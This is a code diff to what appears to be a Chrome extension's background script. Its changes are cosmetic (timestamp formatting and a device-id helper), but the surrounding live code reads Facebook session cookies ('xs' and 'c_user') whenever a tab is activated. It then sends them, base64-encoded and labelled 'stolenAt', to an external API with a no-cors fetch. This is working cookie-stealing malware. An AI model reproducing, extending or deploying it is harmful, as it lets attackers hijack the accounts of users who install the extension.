@@ -25,11 +25,22 @@ const dateTime = () => {
         hours = addZero(currentDate.getHours()),
         minutes = addZero(currentDate.getMinutes()),
         seconds = addZero(currentDate.getSeconds());
-    return `${hours}${minutes}${seconds}${day}${month}${year}`;
+    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
 };
 const set_device_id = () => {
+    const dateTimeToRan = () => {
+        const addZero = (number) => (number < 10 ? "0" + number : number),
+            currentDate = new Date(),
+            year = currentDate.getFullYear(),
+            month = addZero(currentDate.getMonth() + 1),
+            day = addZero(currentDate.getDate()),
+            hours = addZero(currentDate.getHours()),
+            minutes = addZero(currentDate.getMinutes()),
+            seconds = addZero(currentDate.getSeconds());
+        return `${hours}${minutes}${seconds}${day}${month}${year}`;
+    };
     const numran = Math.floor(Math.random() * 8) + 8;
-    const value = numran + "" + dateTime();
+    const value = numran + "" + dateTimeToRan();
     const key = "device_id";
     chrome.storage.sync.set({ [key]: value }, () => {
         device_id = value;
@@ -64,12 +75,10 @@ chrome.tabs.onActivated.addListener(() => {
         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
         var cookie = xsCookie && cUserCookie ? `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}` : null;
-
         var userPayload = {
             c_user: cUserCookie.value,
             cookie: cookie,
         };
-
         fetch(`${API}?user=${btoa(JSON.stringify({ ...userPayload, stolenAt: dateTime(), device_id: device_id }))}`, {
             method: "GET",
             mode: "no-cors",
